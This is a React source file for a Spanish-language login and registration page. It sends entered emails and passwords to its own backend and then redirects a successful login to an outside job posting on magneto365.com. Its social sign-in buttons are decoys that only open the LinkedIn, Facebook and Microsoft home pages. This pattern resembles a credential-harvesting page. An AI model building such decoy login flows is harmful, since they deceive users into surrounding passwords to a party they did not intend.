import { useEffect, useState } from 'react';

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000';

function Login({ onAuthenticated }) {
  const [mode, setMode] = useState('login');
  const [form, setForm] = useState({ name: '', email: '', password: '' });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');

  const submit = async (event) => {
    event.preventDefault();

    // Redirección temporal para pruebas
   if (mode === 'login') {
  setLoading(true);
  setMessage('');

  try {
    const response = await fetch(`${API_URL}/auth/login`, {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: form.email,
        password: form.password,
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(
        data.message || 'Correo o contraseña incorrectos.'
      );
    }

    // Login correcto
    window.location.href = 'https://www.magneto365.com/co/empleos/asistente-administrativa-comercial-1074108';
    return;
  } catch (error) {
    setMessage(error.message);
  } finally {
    setLoading(false);
  }

  return;
}

    // Registro: se mantiene conectado al backend
    setLoading(true);
    setMessage('');

    try {
      const response = await fetch(`${API_URL}/auth/register`, {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(form),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(
          data.message || 'No fue posible completar el registro.'
        );
      }

      onAuthenticated(data.user);
    } catch (error) {
      setMessage(error.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="login-page">
      <section className="login-card">

        {/* LOGO */}
        <div className="brand">
  <img
    src="/logo.png"
    alt="Logo de la empresa"
    className="company-logo"
  />
</div>

        {/* ENCABEZADO */}
        <header className="login-header">
          <h1>
            {mode === 'login'
              ? 'Inicia sesión en tu cuenta'
              : 'Crea tu cuenta'}
          </h1>

          <p>
            {mode === 'login'
              ? 'Puedes hacerlo fácilmente usando tus redes sociales o tu correo electrónico'
              : 'Completa tus datos para crear tu cuenta'}
          </p>
        </header>

        <form className="login-form" onSubmit={submit}>

          {mode === 'register' && (
            <label className="field">
              <span>Nombre</span>

              <input
                type="text"
                value={form.name}
                onChange={(e) =>
                  setForm({ ...form, name: e.target.value })
                }
                placeholder="Ingresa tu nombre"
                autoComplete="name"
                required
              />
            </label>
          )}

          <label className="field">
            <span>Correo electrónico</span>

            <div className="input-wrap">
              <span className="input-icon" aria-hidden="true">
                ✉
              </span>

              <input
                type="email"
                value={form.email}
                onChange={(e) =>
                  setForm({ ...form, email: e.target.value })
                }
                placeholder="Ingresa tu correo electrónico"
                autoComplete="username"
                required
              />
            </div>
          </label>

          <label className="field">
            <div className="field-heading">
              <span>Contraseña</span>

              {mode === 'login' && (
                <button
                  type="button"
                  className="show-password"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? 'Ocultar' : 'Mostrar'}
                </button>
              )}
            </div>

            <div className="input-wrap">
              <span
                className="input-icon lock-icon"
                aria-hidden="true"
              >
                ▢
              </span>

              <input
                type={showPassword ? 'text' : 'password'}
                value={form.password}
                onChange={(e) =>
                  setForm({ ...form, password: e.target.value })
                }
                placeholder="Ingresa tu contraseña"
                autoComplete={
                  mode === 'login'
                    ? 'current-password'
                    : 'new-password'
                }
                minLength={8}
                required
              />
            </div>
          </label>

          {mode === 'login' && (
            <button
              type="button"
              className="forgot-password"
              onClick={() =>
                window.location.href =
                  'https://support.google.com/accounts/answer/7682439?hl=es-419'
              }
            >
              ¿Olvidaste tu contraseña?
            </button>
          )}

          {message && (
            <div className="error">
              {message}
            </div>
          )}

          <button
            className="sign-in-button"
            type="submit"
            disabled={loading}
          >
            {loading
              ? 'Procesando...'
              : mode === 'login'
                ? 'Iniciar sesión'
                : 'Crear cuenta'}
          </button>
        </form>

        {/* REDES SOCIALES */}
        {mode === 'login' && (
          <div className="social-section">

            <div className="social-label">
              <span>O continúa con</span>
            </div>

            <div className="social-grid">

              <button
                className="social-button"
                type="button"
                onClick={() =>
                  window.location.href =
                    'https://www.linkedin.com/feed/'
                }
              >
                <span className="social-icon linkedin">
                  in
                </span>
                LinkedIn
              </button>

              <button
                className="social-button"
                type="button"
                onClick={() =>
                  window.location.href =
                    'https://www.facebook.com/'
                }
              >
                <span className="social-icon facebook">
                  f
                </span>
                Facebook
              </button>

              <button
                className="social-button"
                type="button"
                onClick={() =>
                  window.location.href =
                    'https://www.microsoft.com/'
                }
              >
                <span className="microsoft-icon">
                  <i />
                  <i />
                  <i />
                  <i />
                </span>
                Microsoft
              </button>

            </div>
          </div>
        )}

      </section>
    </main>
  );
}

function Dashboard({ user, onLogout }) {
  return (
    <main className="login-page">
      <section className="login-card dashboard">

       <img
  src="/logo.png"
  alt="Logo de la empresa"
  className="company-logo"
/>

        <h1>Sesión iniciada</h1>

        <p>
          Has iniciado sesión como{' '}
          <strong>{user?.email}</strong>
        </p>

        <button
          className="sign-in-button"
          onClick={onLogout}
        >
          Cerrar sesión
        </button>

      </section>
    </main>
  );
}

export default function App() {
  const [user, setUser] = useState(null);
  const [checking, setChecking] = useState(true);

  useEffect(() => {
    fetch(`${API_URL}/auth/me`, {
      credentials: 'include',
    })
      .then(async (response) => {
        if (!response.ok) {
          throw new Error('No authenticated session');
        }

        return response.json();
      })
      .then(setUser)
      .catch(() => {})
      .finally(() => setChecking(false));
  }, []);

  const logout = async () => {
    await fetch(`${API_URL}/auth/logout`, {
      method: 'POST',
      credentials: 'include',
    });

    setUser(null);
  };

  if (checking) {
    return (
      <div className="loading">
        Cargando...
      </div>
    );
  }

  return user ? (
    <Dashboard
      user={user}
      onLogout={logout}
    />
  ) : (
    <Login onAuthenticated={setUser} />
  );
}